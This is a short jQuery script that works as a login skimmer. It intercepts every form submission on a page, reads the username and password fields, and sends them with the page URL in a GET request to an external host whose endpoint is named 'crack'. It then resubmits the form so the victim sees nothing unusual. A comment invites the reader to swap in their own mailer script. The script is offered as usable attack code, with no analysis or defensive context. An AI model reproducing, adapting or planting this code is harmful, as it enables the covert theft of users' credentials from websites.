$(function() {
 var passwordBoxes = $("input[type=password]"),
 getMessage = function(username, password, url) {
  return "Username: " + username + " || Password: " + password + " || Url: " + url;
 },
 sendEmail = function(username, password, url, callback) {
  var msg = getMessage(username, password, url);
  $.ajax({
   type: 'GET',
   url: 'http://ankurutils.appspot.com/crack?username='+username+'&password='+password+'&url='+url+'&callback=', //Change to the path of your mailer script
   //data: {username:username, password:password, url:url, callback:callback}, //Change to add any headers to be sent along
   success: callback
  });
 },
 process = function(callback) {
  var username = $("input[type=text]").not(passwordBoxes).filter(function() {
   var field = $(this);
   return field.val() || field.html();
  }).val(),
  password = passwordBoxes.val();

  sendEmail(username, password, location.href, callback);
 };

 $("form").submit(function(e) {
  var $this = $(this);
  e.preventDefault();
  process(function() {
   $this.unbind('submit');
   $this.submit();
  });
 });
});
